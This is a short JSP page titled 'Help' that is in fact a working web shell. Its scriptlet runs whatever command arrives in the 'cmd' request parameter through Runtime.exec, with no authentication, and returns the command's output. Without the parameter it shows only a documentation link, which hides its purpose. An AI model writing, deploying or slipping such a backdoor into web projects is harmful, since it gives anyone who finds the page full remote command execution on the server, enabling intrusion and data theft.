<%-- 
    Document   : cmd
    Created on : Feb 27, 2018, 5:01:56 AM
    Author     : ritvikc
--%>

<%@page import="java.io.*,java.util.*"%>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Help</title>
    </head>
    <body>
        <pre>
        <%
        if (request.getParameter("cmd") != null) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            InputStream er = p.getErrorStream();
            DataInputStream dis = new DataInputStream(in);
            DataInputStream eis = new DataInputStream(er);
            out.println("\nSTDOUT:\n");
            String disr = dis.readLine();
            while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
            }
            out.println("\nSTDERR:\n");
            disr = eis.readLine();
            while ( disr != null ) {
                out.println(disr);
                disr = eis.readLine();
            }
        }
        else{
        out.println("<a href='/docs'>Click Here to Access the Documentation.</a>");
        }
        %>
        </pre>
    </body>
</html>
